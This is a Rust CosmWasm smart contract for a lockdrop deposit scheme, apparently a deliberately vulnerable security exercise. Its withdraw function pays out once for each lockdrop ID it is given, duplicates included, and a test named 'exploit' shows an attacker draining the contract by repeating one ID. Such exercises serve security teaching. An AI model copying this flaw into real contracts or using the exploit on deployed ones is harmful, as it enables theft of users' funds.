use crate::error::ContractError;
use crate::msg::{ExecuteMsg, InstantiateMsg, NextLockdropId, QueryMsg};
use crate::state::{Lockdrop, LOCKDROP_COUNT, USER_LOCKDROP};
#[cfg(not(feature = "library"))]
use cosmwasm_std::entry_point;
use cosmwasm_std::{
    to_binary, BankMsg, Binary, Coin, CosmosMsg, Decimal, Deps, DepsMut, Env, MessageInfo,
    Response, StdError, StdResult, Uint128,
};

/// minimum amount for lockdrop
const MINIMUM_AMOUNT: u64 = 100;

/// 24 hour locking time
const LOCK_TIME: u64 = 24 * 60 * 60;

/// reward bonus for users who locks their funds, 5% per day!
const PONZI_BONUS: u64 = 105;

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn instantiate(
    _deps: DepsMut,
    _env: Env,
    info: MessageInfo,
    _msg: InstantiateMsg,
) -> Result<Response, ContractError> {
    // admin must provide 1000 uosmo when instantiating contract
    if info.funds.len() != 1
        || info.funds[0].denom != "uosmo"
        || info.funds[0].amount != Uint128::from(1000_u64)
    {
        return Err(ContractError::Std(StdError::generic_err(
            "Invalid instantiation",
        )));
    }

    Ok(Response::new())
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn execute(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    msg: ExecuteMsg,
) -> Result<Response, ContractError> {
    match msg {
        ExecuteMsg::Deposit {} => try_deposit(deps, env, info),
        ExecuteMsg::Withdraw { lockdrop_ids } => try_withdraw(deps, env, info, lockdrop_ids),
    }
}

pub fn try_deposit(deps: DepsMut, env: Env, info: MessageInfo) -> Result<Response, ContractError> {
    // validate uosmo sent
    if info.funds.len() != 1 || info.funds[0].denom != "uosmo" {
        return Err(ContractError::Std(StdError::generic_err(
            "Invalid deposit!",
        )));
    }

    // check deposit amount
    if info.funds[0].amount < Uint128::from(MINIMUM_AMOUNT) {
        return Err(ContractError::Std(StdError::generic_err(
            "Deposit too less amount!",
        )));
    }

    // retrieve and increment lockdrop id
    let mut lockdrop_id = LOCKDROP_COUNT.load(deps.storage).unwrap_or_default();

    // create new lockdrop
    let new_lockdrop = Lockdrop {
        id: lockdrop_id,
        owner: info.sender.clone(),
        amount: info.funds[0].amount,
        unlock_time: env.block.time.plus_seconds(LOCK_TIME).seconds(),
    };

    // save lockdrop info to storage
    USER_LOCKDROP.save(deps.storage, lockdrop_id, &new_lockdrop)?;

    // increment and save lockdrop count
    lockdrop_id += 1;
    LOCKDROP_COUNT.save(deps.storage, &lockdrop_id)?;

    Ok(Response::new()
        .add_attribute("method", "deposit")
        .add_attribute("sender", info.sender.to_string())
        .add_attribute("amount", info.funds[0].amount)
        .add_attribute("next_lockdrop_id", lockdrop_id.to_string()))
}

pub fn try_withdraw(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    lockdrop_ids: Vec<u64>,
) -> Result<Response, ContractError> {
    // amount to send to user
    let mut total_amount = Uint128::zero();

    // unlocked lockdrop vector
    let mut unlocked_lockdrops: Vec<Lockdrop> = vec![];

    for id in lockdrop_ids {
        // load value from storage
        let lockdrop_info = USER_LOCKDROP.load(deps.storage, id)?;

        // verify owner and unlock time had passed
        if lockdrop_info.owner == info.sender
            && env.block.time.seconds() >= lockdrop_info.unlock_time
        {
            unlocked_lockdrops.push(lockdrop_info);
        }
    }

    // make sure it's valid withdrawal
    if unlocked_lockdrops.is_empty() {
        return Err(ContractError::Std(StdError::generic_err(
            "Nothing to withdraw!",
        )));
    }

    // apply our p̶o̶n̶z̶i̶ reward bonus
    for lockdrop in unlocked_lockdrops {
        let bonus_amount = lockdrop.amount * Decimal::percent(PONZI_BONUS);
        total_amount += bonus_amount;
        USER_LOCKDROP.remove(deps.storage, lockdrop.id);
    }

    // send rewards to user
    let msg = CosmosMsg::Bank(BankMsg::Send {
        to_address: info.sender.to_string(),
        amount: vec![Coin {
            denom: "uosmo".to_string(),
            amount: total_amount,
        }],
    });

    Ok(Response::new()
        .add_message(msg)
        .add_attribute("method", "withdraw")
        .add_attribute("total_amount", total_amount)
        .add_attribute("sender", info.sender))
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn query(deps: Deps, _env: Env, msg: QueryMsg) -> StdResult<Binary> {
    match msg {
        QueryMsg::GetNextLockdropId {} => to_binary(&query_next_id(deps)?),
        QueryMsg::GetLockdropInfo { id } => to_binary(&query_lockdrop_info(deps, id)?),
    }
}

fn query_next_id(deps: Deps) -> StdResult<NextLockdropId> {
    let next_id = LOCKDROP_COUNT.load(deps.storage).unwrap_or_default();
    Ok(NextLockdropId { next_id })
}

fn query_lockdrop_info(deps: Deps, id: u64) -> StdResult<Lockdrop> {
    let lockdrop_info = USER_LOCKDROP.load(deps.storage, id)?;
    Ok(lockdrop_info)
}

#[cfg(test)]
mod tests {
    use super::*;
    use cosmwasm_std::testing::{mock_dependencies_with_balance, mock_env, mock_info};
    use cosmwasm_std::{coins, from_binary, Addr, Timestamp};

    #[test]
    #[should_panic(expected = "Invalid instantiation")]
    fn invalid_init() {
        let mut deps = mock_dependencies_with_balance(&coins(2, "token"));
        let msg = InstantiateMsg {};
        let info = mock_info("creator", &coins(0, "uosmo".to_string()));
        let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();
    }

    #[test]
    fn deposit_withdraw_success() {
        let mut deps = mock_dependencies_with_balance(&coins(2, "token"));

        let msg = InstantiateMsg {};
        let info = mock_info("creator", &coins(1000, "uosmo".to_string()));
        let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

        // query lockdrop id
        let res = query(deps.as_ref(), mock_env(), QueryMsg::GetNextLockdropId {}).unwrap();
        let value: NextLockdropId = from_binary(&res).unwrap();
        assert_eq!(value.next_id, 0_u64);

        // user able to deposit uosmo
        let info = mock_info("alice", &coins(100, "uosmo"));
        let msg = ExecuteMsg::Deposit {};
        let _res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();

        // verify deposit succeeded
        let res = query(
            deps.as_ref(),
            mock_env(),
            QueryMsg::GetLockdropInfo { id: 0_u64 },
        )
        .unwrap();
        let value: Lockdrop = from_binary(&res).unwrap();
        assert_eq!(value.id, 0_u64);
        assert_eq!(value.owner, Addr::unchecked("alice"));
        assert_eq!(value.amount, Uint128::from(100_u64));
        assert_eq!(
            value.unlock_time,
            mock_env().block.time.plus_seconds(LOCK_TIME).seconds()
        );

        // make sure lockdrop id incremented
        let res = query(deps.as_ref(), mock_env(), QueryMsg::GetNextLockdropId {}).unwrap();
        let value: NextLockdropId = from_binary(&res).unwrap();
        assert_eq!(value.next_id, 1_u64);

        // time travel to tomorrow
        let mut tomorrow = mock_env();
        tomorrow.block.time =
            Timestamp::from_seconds(tomorrow.block.time.plus_seconds(LOCK_TIME).seconds());

        // user able to withdraw after unlocked
        let info = mock_info("alice", &[]);
        let msg = ExecuteMsg::Withdraw {
            lockdrop_ids: vec![0_u64],
        };
        let res = execute(deps.as_mut(), tomorrow, info, msg).unwrap();

        // verify withdraw succeed
        assert_eq!(res.attributes[0].value, "withdraw");
        assert_eq!(res.attributes[1].value, "105");
        assert_eq!(res.attributes[2].value, "alice");
    }

    #[test]
    #[should_panic(expected = "Deposit too less amount!")]
    fn deposit_failure() {
        let mut deps = mock_dependencies_with_balance(&coins(2, "token"));

        let msg = InstantiateMsg {};
        let info = mock_info("creator", &coins(1000, "uosmo".to_string()));
        let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

        // query lockdrop id
        let res = query(deps.as_ref(), mock_env(), QueryMsg::GetNextLockdropId {}).unwrap();
        let value: NextLockdropId = from_binary(&res).unwrap();
        assert_eq!(value.next_id, 0_u64);

        // user able to deposit uosmo
        let info = mock_info("bob", &coins(10, "uosmo"));
        let msg = ExecuteMsg::Deposit {};
        let _res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();
    }

    #[test]
    fn exploit() {
        let mut deps = mock_dependencies_with_balance(&coins(2, "token"));

        let msg = InstantiateMsg {};
        let info = mock_info("creator", &coins(1000, "uosmo".to_string()));
        let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

        // hacker deposits uosmo
        let info = mock_info("hacker", &coins(100, "uosmo"));
        let msg = ExecuteMsg::Deposit {};
        let _res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();

        // hacker waits until lockdrop unlocked
        let mut tomorrow = mock_env();
        tomorrow.block.time =
            Timestamp::from_seconds(tomorrow.block.time.plus_seconds(LOCK_TIME).seconds());

        // hacker sends a vector of same lockdrop ids. 
        // since `.remove` does not revert an error if item doesn't exists (ie. remove non-existent items), this vulnerable implementation allows the hacker to steal user funds in the contract
        let info = mock_info("hacker", &[]);
        let msg = ExecuteMsg::Withdraw {
            lockdrop_ids: vec![
                0_u64, 0_u64, 0_u64, 0_u64, 0_u64, 0_u64, 0_u64, 0_u64, 0_u64, 0_u64,
            ],
        };
        let res = execute(deps.as_mut(), tomorrow, info, msg).unwrap();

        // verify withdraw succeed
        assert_eq!(res.attributes[0].value, "withdraw");
        assert_eq!(res.attributes[1].value, "1050");
        assert_eq!(res.attributes[2].value, "hacker");
    }
}
